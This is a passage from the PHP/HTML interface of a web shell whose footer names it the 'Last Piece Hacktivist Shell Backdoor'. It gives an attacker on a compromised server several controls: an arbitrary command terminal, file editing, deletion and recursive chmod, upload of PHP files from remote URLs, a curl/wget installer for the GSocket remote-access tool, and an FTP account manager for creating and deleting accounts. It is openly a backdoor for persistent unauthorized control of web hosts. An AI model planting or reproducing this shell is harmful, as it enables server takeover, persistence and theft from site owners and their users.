                    <input type="hidden" name="upload" value="1">
                </form>
                <button onclick="showModal('multiupload')" class="btn btn-secondary btn-sm">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
                        <polyline points="17 8 12 3 7 8"/>
                        <line x1="12" y1="3" x2="12" y2="15"/>
                    </svg>
                    Multi Upload
                </button>
                <button onclick="showModal('remote')" class="btn btn-secondary btn-sm">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/>
                        <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/>
                    </svg>
                    Remote Upload
                </button>
                <button onclick="showModal('newfile')" class="btn btn-secondary btn-sm">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
                        <polyline points="14 2 14 8 20 8"/>
                        <line x1="12" y1="18" x2="12" y2="12"/>
                        <line x1="9" y1="15" x2="15" y2="15"/>
                    </svg>
                    New File
                </button>
                <button onclick="showModal('newfolder')" class="btn btn-secondary btn-sm">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M4 20h16a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.93a2 2 0 0 1-1.66-.9l-.82-1.2A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13c0 1.1.9 2 2 2Z"/>
                        <line x1="12" y1="10" x2="12" y2="16"/>
                        <line x1="9" y1="13" x2="15" y2="13"/>
                    </svg>
                    New Folder
                </button>
            </div>
        </div>
        
        <div class="toolbar">
            <div class="toolbar-label">Terminal</div>
            <form method="POST" class="terminal-form">
                <input type="text" name="cmd" class="terminal-input" placeholder="Enter command..." autocomplete="off">
                <button type="submit" class="btn btn-primary btn-sm">Run</button>
            </form>
        </div>
        
        <?php if ($cmdOutput): ?>
        <div class="terminal-output"><?php echo htmlspecialchars($cmdOutput); ?></div>
        <?php endif; ?>
        
        <div class="table-wrapper">
            <div class="table-scroll">
                <table class="file-table">
                    <thead>
                        <tr>
                            <th>Name</th>
                            <th class="hide-mobile">Size</th>
                            <th>Permission</th>
                            <th class="hide-mobile">Modified</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td colspan="5">
                                <a href="?nomi=.." class="file-name">
                                    <svg class="file-icon folder" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                        <path d="M4 20h16a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.93a2 2 0 0 1-1.66-.9l-.82-1.2A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13c0 1.1.9 2 2 2Z"/>
                                    </svg>
                                    ..
                                </a>
                            </td>
                        </tr>
                        <?php foreach ($files as $file): ?>
                        <?php $fullPath = $currentDirectory . '/' . $file['name']; ?>
                        <tr>
                            <td>
                                <?php if ($file['type'] === 'Folder'): ?>
                                <a href="?nomi=<?php echo urlencode($fullPath); ?>" class="file-name">
                                    <?php echo getFileIcon($file['type'], $file['name']); ?>
                                    <?php echo htmlspecialchars($file['name']); ?>
                                </a>
                                <?php else: ?>
                                <span class="file-name">
                                    <?php echo getFileIcon($file['type'], $file['name']); ?>
                                    <?php echo htmlspecialchars($file['name']); ?>
                                </span>
                                <?php endif; ?>
                            </td>
                            <td class="hide-mobile text-muted"><?php echo $file['size']; ?></td>
                            <td>
                                <span class="<?php echo $file['writable'] ? 'perm-writable' : 'perm-readonly'; ?>">
                                    <?php echo $file['permission']; ?>
                                </span>
                            </td>
                            <td class="hide-mobile text-muted"><?php echo $file['modified']; ?></td>
                            <td>
                                <div class="file-actions">
                                    <?php if ($file['type'] !== 'Folder'): ?>
                                    <a href="?edit=<?php echo urlencode($fullPath); ?>" class="action-btn">Edit</a>
                                    <?php endif; ?>
                                    <a href="?chmod=<?php echo urlencode($fullPath); ?>" class="action-btn">Chmod</a>
                                    <a href="?rename=<?php echo urlencode($fullPath); ?>" class="action-btn">Rename</a>
                                    <a href="#" class="action-btn danger" onclick="showDeleteConfirm('<?php echo urlencode($fullPath); ?>', '<?php echo htmlspecialchars(addslashes($item)); ?>'); return false;">Delete</a>
                                </div>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        </div>
        
        
    </main>
    
    <footer class="app-footer">
        <div class="footer-content">
            <div class="footer-brand">
                <img src="https://g.top4top.io/p_3688ocdw61.png" alt="Portgas D Ace" class="footer-avatar">
                <div class="footer-info">
                    <div class="footer-title">Last Piece Hacktivist Shell Backdoor</div>
                    <div class="footer-version">v1.0.0</div>
                </div>
            </div>
            <div class="footer-credit">
                Created by <span class="footer-author">Portgas D Ace</span>
            </div>
        </div>
    </footer>
</div>

<div class="modal-overlay hidden" id="chmodModal">
    <div class="modal" style="max-width: 450px;">
        <div class="modal-header">
            <span class="modal-title">Mass Chmod</span>
            <button class="modal-close" onclick="hideModal('chmod')">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <line x1="18" y1="6" x2="6" y2="18"/>
                    <line x1="6" y1="6" x2="18" y2="18"/>
                </svg>
            </button>
        </div>
        <form method="POST">
            <div class="modal-body">
                <p style="color: var(--text-muted); font-size: 11px; margin-bottom: 14px;">Change permissions recursively for all folders and files in the target path.</p>
                
                <div class="form-group">
                    <label class="form-label">Target Path</label>
                    <input type="text" name="chmod_path" class="form-input" value="<?php echo htmlspecialchars($currentDirectory); ?>" style="font-size: 12px;" required>
                </div>
                
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
                    <div class="form-group">
                        <label class="form-label">Folder Permission</label>
                        <input type="text" name="chmod_folder" class="form-input" placeholder="0755" value="0755" maxlength="4" pattern="[0-7]{3,4}" style="font-size: 12px;" required>
                        <span style="font-size: 10px; color: var(--text-muted);">e.g. 0755, 0777, 0750</span>
                    </div>
                    <div class="form-group">
                        <label class="form-label">File Permission</label>
                        <input type="text" name="chmod_file" class="form-input" placeholder="0644" value="0644" maxlength="4" pattern="[0-7]{3,4}" style="font-size: 12px;" required>
                        <span style="font-size: 10px; color: var(--text-muted);">e.g. 0644, 0666, 0600</span>
                    </div>
                </div>
                
                <div style="background: rgba(245, 158, 11, 0.1); border: 1px solid rgba(245, 158, 11, 0.3); border-radius: 6px; padding: 10px; margin-top: 12px;">
                    <p style="color: var(--gold); font-size: 11px; display: flex; align-items: center; gap: 6px;">
                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
                            <line x1="12" y1="9" x2="12" y2="13"/>
                            <line x1="12" y1="17" x2="12.01" y2="17"/>
                        </svg>
                        This will change permissions for ALL files and folders recursively!
                    </p>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" onclick="hideModal('chmod')">Cancel</button>
                <button type="submit" name="mass_chmod" class="btn btn-primary">Apply Chmod</button>
            </div>
        </form>
    </div>
</div>

<div class="modal-overlay hidden" id="multiuploadModal">
    <div class="modal" style="max-width: 550px;">
        <div class="modal-header">
            <span class="modal-title">Multi Upload</span>
            <button class="modal-close" onclick="hideModal('multiupload')">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <line x1="18" y1="6" x2="6" y2="18"/>
                    <line x1="6" y1="6" x2="18" y2="18"/>
                </svg>
            </button>
        </div>
        <form method="POST" enctype="multipart/form-data" id="multiUploadForm">
            <div class="modal-body">
                <p style="color: var(--text-muted); font-size: 12px; margin-bottom: 12px;">Select multiple files from different uploaders, then click Upload All.</p>
                <div id="uploadersContainer">
                    <div class="uploader-row">
                        <label class="custom-file-input">
                            <input type="file" name="files[]" onchange="updateFileName(this)">
                            <span class="file-btn">
                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
                                    <polyline points="17 8 12 3 7 8"/>
                                    <line x1="12" y1="3" x2="12" y2="15"/>
                                </svg>
                                Choose File
                            </span>
                            <span class="file-name">No file selected</span>
                        </label>
                        <button type="button" class="btn btn-danger btn-sm" onclick="removeUploader(this)" style="padding: 6px 10px;">X</button>
                    </div>
                </div>
                <button type="button" class="btn btn-secondary btn-sm" onclick="addUploader()" style="margin-top: 10px; width: 100%;">
                    + Add More File
                </button>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" onclick="hideModal('multiupload')">Cancel</button>
                <button type="submit" name="multi_upload" class="btn btn-primary">Upload All</button>
            </div>
        </form>
    </div>
</div>

<div class="modal-overlay hidden" id="remoteModal">
    <div class="modal" style="max-width: 500px;">
        <div class="modal-header">
            <span class="modal-title">Remote Upload</span>
            <button class="modal-close" onclick="hideModal('remote')">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <line x1="18" y1="6" x2="6" y2="18"/>
                    <line x1="6" y1="6" x2="18" y2="18"/>
                </svg>
            </button>
        </div>
        <form method="POST">
            <div class="modal-body">
                <div class="form-group">
                    <label class="form-label">Raw URL</label>
                    <input type="url" name="remote_url" class="form-input" placeholder="https://example.com/file.php" required>
                </div>
                <div class="form-group">
                    <label class="form-label">Save As (filename)</label>
                    <input type="text" name="remote_filename" class="form-input" placeholder="myfile.php" required>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" onclick="hideModal('remote')">Cancel</button>
                <button type="submit" name="remote_upload" class="btn btn-primary">Download</button>
            </div>
        </form>
    </div>
</div>

<div class="modal-overlay hidden" id="newfileModal">
    <div class="modal">
        <div class="modal-header">
            <span class="modal-title">Create New File</span>
            <button class="modal-close" onclick="hideModal('newfile')">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <line x1="18" y1="6" x2="6" y2="18"/>
                    <line x1="6" y1="6" x2="18" y2="18"/>
                </svg>
            </button>
        </div>
        <form method="POST">
            <div class="modal-body">
                <div class="form-group">
                    <label class="form-label">File Name</label>
                    <input type="text" name="filename" class="form-input" placeholder="example.php" required>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" onclick="hideModal('newfile')">Cancel</button>
                <button type="submit" name="newfile" class="btn btn-primary">Create</button>
            </div>
        </form>
    </div>
</div>

<div class="modal-overlay hidden" id="newfolderModal">
    <div class="modal">
        <div class="modal-header">
            <span class="modal-title">Create New Folder</span>
            <button class="modal-close" onclick="hideModal('newfolder')">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <line x1="18" y1="6" x2="6" y2="18"/>
                    <line x1="6" y1="6" x2="18" y2="18"/>
                </svg>
            </button>
        </div>
        <form method="POST">
            <div class="modal-body">
                <div class="form-group">
                    <label class="form-label">Folder Name</label>
                    <input type="text" name="foldername" class="form-input" placeholder="new-folder" required>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" onclick="hideModal('newfolder')">Cancel</button>
                <button type="submit" name="newfolder" class="btn btn-primary">Create</button>
            </div>
        </form>
    </div>
</div>

<div class="modal-overlay hidden" id="gsocketModal">
    <div class="modal" style="max-width: 500px;">
        <div class="modal-header">
            <span class="modal-title">GSocket Installer</span>
            <button class="modal-close" onclick="hideModal('gsocket')">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <line x1="18" y1="6" x2="6" y2="18"/>
                    <line x1="6" y1="6" x2="18" y2="18"/>
                </svg>
            </button>
        </div>
        <div class="modal-body">
            <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">
                GSocket allows you to establish encrypted connections. Choose an action below:
            </p>
            <div style="display: flex; flex-direction: column; gap: 10px;">
                <div style="background: var(--bg-input); border: 1px solid var(--border); border-radius: 8px; padding: 14px;">
                    <div style="font-weight: 600; color: var(--accent); margin-bottom: 8px; font-size: 13px;">Install with cURL</div>
                    <form method="POST" style="display: flex; gap: 8px;">
                        <input type="hidden" name="gsocket_cmd" value="install_curl">
                        <button type="submit" name="gsocket_action" class="btn btn-primary btn-sm" style="flex: 1;">Install</button>
                    </form>
                </div>
                <div style="background: var(--bg-input); border: 1px solid var(--border); border-radius: 8px; padding: 14px;">
                    <div style="font-weight: 600; color: var(--accent); margin-bottom: 8px; font-size: 13px;">Install with wget</div>
                    <form method="POST" style="display: flex; gap: 8px;">
                        <input type="hidden" name="gsocket_cmd" value="install_wget">
                        <button type="submit" name="gsocket_action" class="btn btn-primary btn-sm" style="flex: 1;">Install</button>
                    </form>
                </div>
                <div style="background: var(--bg-input); border: 1px solid rgba(248, 81, 73, 0.3); border-radius: 8px; padding: 14px;">
                    <div style="font-weight: 600; color: var(--red); margin-bottom: 8px; font-size: 13px;">Uninstall GSocket</div>
                    <div style="display: flex; gap: 8px;">
                        <form method="POST" style="flex: 1;">
                            <input type="hidden" name="gsocket_cmd" value="uninstall_curl">
                            <button type="submit" name="gsocket_action" class="btn btn-danger btn-sm" style="width: 100%;">cURL</button>
                        </form>
                        <form method="POST" style="flex: 1;">
                            <input type="hidden" name="gsocket_cmd" value="uninstall_wget">
                            <button type="submit" name="gsocket_action" class="btn btn-danger btn-sm" style="width: 100%;">wget</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>
        </div>
        <div class="modal-footer">
            <button type="button" class="btn btn-secondary" onclick="hideModal('gsocket')">Close</button>
        </div>
    </div>
</div>

<div class="modal-overlay hidden" id="ftpModal">
    <div class="modal" style="max-width: 550px;">
        <div class="modal-header">
            <span class="modal-title">FTP Manager</span>
            <button class="modal-close" onclick="hideModal('ftp')">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <line x1="18" y1="6" x2="6" y2="18"/>
                    <line x1="6" y1="6" x2="18" y2="18"/>
                </svg>
            </button>
        </div>
        <div class="modal-body">
            <div style="display: flex; flex-direction: column; gap: 12px;">
                
                <div style="background: var(--bg-input); border: 1px solid var(--border); border-radius: 8px; padding: 12px;">
                    <div style="font-weight: 600; color: var(--accent); margin-bottom: 8px; font-size: 12px;">List FTP Accounts</div>
                    <form method="POST">
                        <button type="submit" name="ftp_list" class="btn btn-primary btn-sm" style="width: 100%;">Show All FTP</button>
                    </form>
                </div>
                
                <div style="background: var(--bg-input); border: 1px solid var(--border); border-radius: 8px; padding: 12px;">
                    <div style="font-weight: 600; color: var(--gold); margin-bottom: 8px; font-size: 12px;">Add FTP Account (homedir auto-detect)</div>
                    <form method="POST">
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 6px; margin-bottom: 8px;">
                            <input type="text" name="ftp_user" class="form-input" placeholder="Username" required style="font-size: 11px; padding: 6px 8px;">
                            <input type="text" name="ftp_pass" class="form-input" placeholder="Password" required style="font-size: 11px; padding: 6px 8px;">
                        </div>
                        <div style="display: flex; gap: 6px;">
                            <input type="text" name="ftp_quota" class="form-input" placeholder="Quota (0=unlimited)" style="font-size: 11px; padding: 6px 8px; width: 140px;">
                            <button type="submit" name="ftp_add" class="btn btn-primary btn-sm" style="flex: 1;">Create FTP</button>
                        </div>
                    </form>
                </div>
                
                <div style="background: var(--bg-input); border: 1px solid var(--border); border-radius: 8px; padding: 12px;">
                    <div style="font-weight: 600; color: var(--purple); margin-bottom: 8px; font-size: 12px;">Change FTP Password</div>
                    <form method="POST">
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 6px; margin-bottom: 8px;">
                            <input type="text" name="ftp_chg_user" class="form-input" placeholder="Username" required style="font-size: 11px; padding: 6px 8px;">
                            <input type="text" name="ftp_chg_domain" class="form-input" placeholder="Domain (e.g. domain.com)" required style="font-size: 11px; padding: 6px 8px;">
                        </div>
                        <div style="display: flex; gap: 6px;">
                            <input type="text" name="ftp_chg_pass" class="form-input" placeholder="New Password" required style="font-size: 11px; padding: 6px 8px; flex: 1;">
                            <button type="submit" name="ftp_passwd" class="btn btn-gsocket btn-sm">Change</button>
                        </div>
                    </form>
                </div>
                
                <div style="background: var(--bg-input); border: 1px solid rgba(248, 81, 73, 0.3); border-radius: 8px; padding: 12px;">
                    <div style="font-weight: 600; color: var(--red); margin-bottom: 8px; font-size: 12px;">Delete FTP Account</div>
                    <form method="POST">
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 6px; margin-bottom: 8px;">
                            <input type="text" name="ftp_del_user" class="form-input" placeholder="Username" required style="font-size: 11px; padding: 6px 8px;">
                            <input type="text" name="ftp_del_domain" class="form-input" placeholder="Domain (e.g. domain.com)" required style="font-size: 11px; padding: 6px 8px;">
                        </div>
                        <button type="submit" name="ftp_delete" class="btn btn-danger btn-sm" style="width: 100%;">Delete FTP</button>
                    </form>
                </div>
                
            </div>
        </div>
        <div class="modal-footer">
            <button type="button" class="btn btn-secondary" onclick="hideModal('ftp')">Close</button>
        </div>
    </div>
</div>

<div class="modal-overlay hidden" id="deleteConfirmModal">
    <div class="modal" style="max-width: 400px;">
        <div class="modal-header" style="border-bottom-color: rgba(248, 81, 73, 0.3);">
            <span class="modal-title" style="color: var(--red);">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display: inline-block; vertical-align: middle; margin-right: 6px;">
                    <path d="M3 6h18"/>
                    <path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6"/>
                    <path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"/>
                    <line x1="10" y1="11" x2="10" y2="17"/>
                    <line x1="14" y1="11" x2="14" y2="17"/>
                </svg>
                Delete Confirmation
            </span>
            <button class="modal-close" onclick="hideDeleteConfirm()">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <line x1="18" y1="6" x2="6" y2="18"/>
                    <line x1="6" y1="6" x2="18" y2="18"/>
                </svg>
            </button>
        </div>
        <div class="modal-body" style="text-align: center; padding: 24px;">
            <div style="width: 60px; height: 60px; background: rgba(248, 81, 73, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px;">
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="var(--red)" stroke-width="2">
                    <circle cx="12" cy="12" r="10"/>
                    <line x1="12" y1="8" x2="12" y2="12"/>
                    <line x1="12" y1="16" x2="12.01" y2="16"/>
                </svg>
            </div>
            <p style="color: var(--text); font-size: 14px; margin-bottom: 8px;">Are you sure you want to delete?</p>
            <p id="deleteFileName" style="color: var(--gold); font-size: 13px; font-weight: 600; word-break: break-all;"></p>
            <p style="color: var(--text-muted); font-size: 11px; margin-top: 12px;">This action cannot be undone.</p>
        </div>
        <div class="modal-footer" style="justify-content: center; gap: 12px;">
            <button type="button" class="btn btn-secondary" onclick="hideDeleteConfirm()">Cancel</button>
            <a id="deleteConfirmBtn" href="#" class="btn btn-danger" style="background: var(--red); border-color: var(--red); color: white;">Delete</a>
        </div>
    </div>
</div>

<script>
var deleteTargetPath = '';

function showDeleteConfirm(path, name) {
    deleteTargetPath = path;
    document.getElementById('deleteFileName').textContent = decodeURIComponent(name);
    document.getElementById('deleteConfirmBtn').href = '?delete=' + path;
    document.getElementById('deleteConfirmModal').classList.remove('hidden');
}

function hideDeleteConfirm() {
    document.getElementById('deleteConfirmModal').classList.add('hidden');
}

function showModal(type) {
    document.getElementById(type + 'Modal').classList.remove('hidden');
}
function hideModal(type) {
    document.getElementById(type + 'Modal').classList.add('hidden');
}

function addUploader() {
    var container = document.getElementById('uploadersContainer');
    var row = document.createElement('div');
    row.className = 'uploader-row';
    row.innerHTML = '<label class="custom-file-input"><input type="file" name="files[]" onchange="updateFileName(this)"><span class="file-btn"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>Choose File</span><span class="file-name">No file selected</span></label><button type="button" class="btn btn-danger btn-sm" onclick="removeUploader(this)" style="padding: 6px 10px;">X</button>';
    container.appendChild(row);
}

function removeUploader(btn) {
    var container = document.getElementById('uploadersContainer');
    if (container.children.length > 1) {
        btn.parentElement.remove();
    }
}

function updateFileName(input) {
    var label = input.closest('.custom-file-input');
    var nameSpan = label.querySelector('.file-name');
    if (input.files.length > 0) {
        nameSpan.textContent = input.files[0].name;
        label.classList.add('has-file');
    } else {
        nameSpan.textContent = 'No file selected';
        label.classList.remove('has-file');
    }
}

document.querySelectorAll('.modal-overlay').forEach(function(overlay) {
    overlay.addEventListener('click', function(e) {
        if (e.target === overlay) {
            overlay.classList.add('hidden');
        }
    });
});
</script>
<?php endif; ?>
</body>
</html>
